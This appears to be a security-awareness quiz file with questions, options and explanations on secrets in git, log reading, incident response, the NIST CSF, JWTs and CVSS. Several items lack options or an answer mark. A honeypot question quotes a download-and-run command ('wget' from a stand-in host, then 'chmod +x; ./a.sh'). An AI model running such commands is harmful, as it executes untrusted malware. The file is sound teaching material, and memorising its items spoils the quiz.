q: You committed an API key by mistake and then deleted it in the next commit. What should you do?
options: Rotate the key, because it is still in git history
why: Git keeps history. Anyone who can read the repo history can read the old key, so the key itself must be replaced.

q: A log shows 40 failed logins for one user from one address, then a success from the same address. What is the best reading?
options: A possible brute-force that worked: check the account and reset it
why: Many failures followed by a success is a classic takeover pattern. It is a lead to investigate, not proof.

q: Which header tells browsers to use HTTPS for future visits?
why: HSTS stops downgrade attacks by making the browser refuse plain HTTP for that site.

q: Why should a database port not be open to the whole network?
options: Anyone who can reach it can try to log in or exploit it
why: Every reachable service is attack surface. Bind to localhost or firewall it unless remote access is needed.

q: What is the difference between hashing and encryption?
options: A hash is one-way; encryption can be reversed with the key
why: You can't recover the input from a hash. That is why passwords are stored as slow, salted hashes.

q: During an incident, what comes before cleaning up?
options: Contain it and preserve evidence and a timeline
why: Cleaning first destroys the evidence you need to learn what happened and whether it is really over.

q: A honeypot log shows 'wget http://x.example/a.sh' followed by 'chmod +x a.sh; ./a.sh'. What do you do with the file?
options: Run it in a VM to see what it does
Never run it; treat the URL and file as malicious and study them only in an isolated analysis setup
Open it on your laptop with antivirus on
why: Downloads are real malware. Analysis belongs in an isolated, throwaway environment with no network path to anything you care about; for learning, read the commands instead.

q: All source addresses in your honeypot log start with 192.168. What does that tell you?
options: You are being attacked from inside your building
It is your own lab traffic, not internet attackers
These are the most dangerous sources
why: 192.168.0.0/16 is private address space. Real internet attackers only appear if the honeypot is reachable from outside, which carries risk.

q: An audit shows WDigest UseLogonCredential = 1 on a workstation. Why does this matter?
options: Clear-text passwords can be read from memory by credential-theft tools
why: With the value at 1, Windows caches reusable clear-text credentials in memory where tools such as Mimikatz can read them. Set it to 0 and alert if it changes.

q: You want to disable SMB1 across 400 PCs. What is the safe order?
options: Audit what uses it, pilot on a few PCs, deploy in phases with a backout plan
Wait for Windows to remove it
why: Old scanners, NAS boxes and applications sometimes still use SMB1. Audit first, pilot, then phase the change in with a way back.

q: A team hides its admin page at an odd URL and says nobody will find it. Which principle is this?
why: Secrecy of the design is not access control. Add real authentication; an attacker only has to find the URL once.

q: The same account raises a payment, approves it and audits it. What is missing?
why: No single person should control a whole sensitive process. Split request, approval and audit.

q: A SYN flood fills the server's half-open connection table so real users cannot connect. Which CIA property is hit?
why: Authorised users cannot use the service. Defences: SYN cookies, rate limiting, DDoS protection, capacity.

q: Which pair of controls mainly protects integrity?
why: Hashes, signatures and MACs let you detect that data was changed. Encryption mainly protects confidentiality; backups and failover protect availability.

q: Kerckhoffs's principle says a cryptosystem should be secure if...
options: Everything except the key is public
why: Only the key is the secret. A secret, home-made algorithm is a warning sign, not a strength.

q: Your incident response plan belongs to which NIST CSF function?
why: Responding is containing and communicating during an incident. Restoring service afterwards is Recover. (The source reading wrongly put incident plans under Identify.)

q: What did CSF 2.0 add to the original five functions?
why: Govern covers strategy, roles, policy, risk appetite and supply-chain risk.

q: A restore test of your backups counts as which function?
why: Proving you can restore is Recover. Taking the backup is partly Protect, but only a restore proves it works.

q: Are the CSF functions steps to be completed in order?
options: Yes, Identify first and Recover last
No, they run together and feed each other
why: It is a continuous cycle: lessons from Recover change Govern and Identify.

q: You can read the claims inside a JWT without the secret. This means...
options: Decoding proves nothing; only checking the signature does
Only HS256 tokens can be read
why: The payload is only base64-encoded. The signature, checked by the server, is what shows it was not changed.

q: A flaw has a CVSS base score of 9.8. For your organisation it is...
options: Severe in general; your risk also depends on exposure, exploits and asset value
why: CVSS base rates the flaw itself. Exposure, exploit availability and what the system holds decide your risk.

q: A playbook can isolate a host automatically. The safest design is...
options: Isolate only after a person approves
why: A wrong match would cut off a real system, so steps that remove access should wait for a human.
